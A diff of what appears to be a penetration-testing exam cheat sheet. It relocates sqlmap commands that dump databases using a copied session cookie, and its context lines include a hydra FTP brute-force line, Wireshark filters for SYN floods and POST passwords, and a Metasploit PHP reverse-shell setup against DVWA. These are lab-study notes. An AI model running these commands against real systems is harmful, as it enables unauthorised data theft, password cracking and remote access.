@@ -102,6 +102,18 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
+
+7. SQLi:
+login>[Q]>console[document.cookie=copy the value]
+sqlmap -u "website" --cookie="value" --dbs
+sqlmap -u "website" --cookie="value" -D databse --tables
+sqlmap -u "website" --cookie="value" -D database --dump -T tablename
+
+SQL:
+jsql
+[url with id] & attack
+sqlmap
+sqlmap -u "website" --cookie="value" --dbs
 ```
 # Android
 ```
@@ -133,6 +145,9 @@ tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statis
 tcp.flags.syn == 1   (Which machine for dos)
 http.request.method == POST   (for passwords) or click tools ---> credentials
 Also
+DDOS:
+wireshark> statistics ipv4>source and destination
+filter[tcp.flags.syn==1 and tcp.flags.ack==0] [Most packets=ans]
 ```
 # Find FQDN
 ```
@@ -204,17 +219,6 @@ nmap -A -p 21 ip
 hydra -L user.txt -P pass.txt ftp://ip
 ftp ip and type: username and password
 
-
-DDOS:
-wireshark> statistics ipv4>source and destination
-filter[tcp.flags.syn==1 and tcp.flags.ack==0] [Most packets=ans]
-
-SQL:
-login>[Q]>console[document.cookie=copy the value]
-sqlmap -u "website" --cookie="value" --dbs
-sqlmap -u "website" --cookie="value" -D databse --tables
-sqlmap -u "website" --cookie="value" -D database --dump -T tablename
-
 DVWA:
 ZAP
 payload :
@@ -226,12 +230,6 @@ set payload php/meterpreter/reverse_tcp
 set lhost ip [upload file]
 run [paste it in url]
 ls and get the file
-
-SQL:
-jsql
-[url with id] & attack
-sqlmap
-sqlmap -u "website" --cookie="value" --dbs
 ```
 # CVE / Vulnerability Analysis
 ```
